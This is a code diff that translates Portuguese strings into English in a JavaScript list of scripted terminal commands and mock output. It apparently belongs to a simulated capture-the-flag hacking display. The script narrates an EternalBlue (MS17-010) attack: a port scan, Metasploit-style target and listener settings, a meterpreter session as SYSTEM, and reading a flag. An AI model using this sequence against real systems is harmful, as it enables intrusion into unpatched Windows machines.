@@ -26,7 +26,7 @@ const COMMANDS = [
     out: [
       'PORT    STATE SERVICE      VERSION',
       '445/tcp open  microsoft-ds Windows 7/10 (workgroup: WORKGROUP)',
-      '[!] alvo provavel vulneravel a MS17-010 (EternalBlue)',
+      '[!] target likely vulnerable to MS17-010 (EternalBlue)',
     ],
   },
   {
@@ -39,15 +39,15 @@ const COMMANDS = [
   {
     cmd: 'set RHOSTS 10.0.1.20;set LHOST 10.0.1.5;run',
     out: [
-      '[+] alvo VULNERAVEL — Windows 7 SP1 x64',
-      '[*] corrompendo pool nao-paginado... enviando payload',
-      '[+] sessao meterpreter aberta -> nt authority\\system',
+      '[+] target VULNERABLE — Windows 7 SP1 x64',
+      '[*] corrupting non-paged pool... sending payload',
+      '[+] meterpreter session opened -> nt authority\\system',
     ],
   },
   {
     cmd: 'cat /flag.txt',
     out: [
-      '[+] flag{um_d1a_4pos_0_0utr0_t3nt4nd0}',
+      '[+] flag{d4y_4ft3r_d4y_st1ll_try1ng}',
     ],
   },
 ];
